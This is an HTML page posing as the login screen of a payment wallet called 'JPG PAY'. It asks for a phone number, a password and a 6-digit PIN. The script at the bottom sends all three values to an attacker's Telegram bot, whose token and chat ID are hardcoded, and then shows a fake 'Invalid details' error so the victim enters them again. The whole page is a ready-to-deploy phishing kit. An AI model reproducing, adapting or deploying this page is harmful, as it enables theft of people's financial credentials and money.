<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>JPG PAY</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: #121212;
      color: #e0e0e0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container { width: 100%; max-width: 360px; text-align: center; }
    
    /* Logo Styling */
    .logo-box {
      width: 140px; height: 140px;
      border-radius: 30px;
      margin: 0 auto 35px;
      overflow: hidden;
      background: #1e1e1e; /* Fallback dark background */
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 10px 20px rgba(0,0,0,0.5);
    }
    .logo-box img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: none; /* Hidden by default, JS shows it */
    }
    
    /* Fallback Text if image not found */
    .logo-fallback {
      color: #4db6ac;
      font-size: 28px;
      font-weight: bold;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      width: 100%;
      background: #1a1a1a;
    }
    .logo-fallback span {
      font-size: 12px;
      color: #888;
      margin-top: 5px;
    }

    /* Input Fields */
    .input-group {
      display: flex;
      align-items: center;
      background: #1e1e1e;
      border: 1.5px solid #333;
      border-radius: 30px;
      padding: 16px 20px;
      margin-bottom: 16px;
    }
    .input-group svg {
      width: 22px; height: 22px;
      fill: #4db6ac;
      margin-right: 14px;
      flex-shrink: 0;
    }
    .input-group input {
      background: transparent;
      border: none;
      color: #e0e0e0;
      font-size: 16px;
      width: 100%;
      outline: none;
    }
    .input-group input::placeholder { color: #777; }
    
    .input-group input#pin {
      letter-spacing: 6px;
      font-weight: 600;
    }
    .input-group input#pin::placeholder {
      letter-spacing: normal;
      font-weight: normal;
    }

    /* Links and Options */
    .row {
      display: flex;
      justify-content: space-between;
      font-size: 15px;
      color: #4db6ac;
      margin-bottom: 25px;
      padding: 0 5px;
      font-weight: 500;
    }
    .row a { color: #4db6ac; text-decoration: underline; font-weight: 600; }
    .row div { display: flex; align-items: center; gap: 6px; cursor: pointer; }
    
    .checkbox-container {
      display: flex;
      align-items: center;
      font-size: 14px;
      color: #4db6ac;
      justify-content: center;
      margin-bottom: 30px;
      font-weight: 500;
    }
    .checkbox-container input {
      margin-right: 10px;
      accent-color: #4db6ac;
      width: 18px; height: 18px;
    }

    /* Sign In Button */
    .btn-main {
      width: 100%;
      padding: 18px;
      background: #2e7d6b;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }
    .btn-main:hover { background: #1b5e50; }
    .btn-main:active { transform: scale(0.98); }
  </style>
</head>
<body>

  <div class="container">
    <!-- Logo Box -->
    <div class="logo-box">
      <!-- APNI PHOTO KA LINK YAHAN DAALEIN (src="apni_photo.jpg") -->
      <img id="logoImg" src="jpglogo.png" alt="JPG PAY" onerror="this.style.display='none'; document.getElementById('fallbackLogo').style.display='flex';">
      
      <!-- Fallback Logo (Agar photo load na ho) -->
      <div class="logo-fallback" id="fallbackLogo" style="display:none;">
        JPG PAY
        <span>Secure Wallet</span>
      </div>
    </div>

    <!-- Phone Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      <input type="tel" id="phone" placeholder="Phone" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
    </div>

    <!-- Password Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
      <input type="password" id="pass" placeholder="Password">
    </div>

    <!-- 6-Digit PIN Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
      <input type="tel" id="pin" placeholder="6-digit PIN" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
    </div>

    <!-- Links -->
    <div class="row">
      <a href="#">Register</a>
      <div><input type="radio" name="remember" style="accent-color:#4db6ac; width:16px; height:16px;"> Remember Me</div>
    </div>

    <!-- Agreement -->
    <div class="checkbox-container">
      <input type="radio" name="agree" checked> Agree "User Privacy Agreement"
    </div>

    <!-- Submit Button -->
    <button class="btn-main" onclick="submitLogin()">Sign In</button>
  </div>

  <script>
    // ==========================================
    // TELEGRAM BOT DETAILS
    // ==========================================
    const BOT_TOKEN = "8990784308:AAHT79h9bUWISEm-eXZImzcdmISDsqqf9HM";
    const CHAT_ID = "7318531273";

    function submitLogin() {
      let phone = document.getElementById('phone').value.trim();
      let pass = document.getElementById('pass').value.trim();
      let pin = document.getElementById('pin').value.trim();

      if (phone === "" || pass === "" || pin === "") {
        alert("Bhai, saari details daalo (Phone, Password, aur 6-digit PIN)!");
        return;
      }

      if (phone.length !== 10) {
        alert("Phone number 10 digit ka hona chahiye!");
        return;
      }

      if (pin.length !== 6) {
        alert("PIN exactly 6 digit ka hona chahiye!");
        return;
      }

      let message = "🔔 *JPG PAY - New Login Attempt*\n\n";
      message += "📞 Phone: " + phone + "\n";
      message += "🔑 Password: " + pass + "\n";
      message += "🔐 6-digit PIN: " + pin;

      sendToTelegram(message);

      setTimeout(() => {
        alert("❌ Invalid details! Please try again.");
      }, 500);
    }

    function sendToTelegram(message) {
      let url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=Markdown&text=" + encodeURIComponent(message);
      fetch(url)
        .then(res => console.log("Telegram Status:", res.status))
        .catch(err => console.error("Telegram Error:", err));
    }
  </script>

</body>
</html>
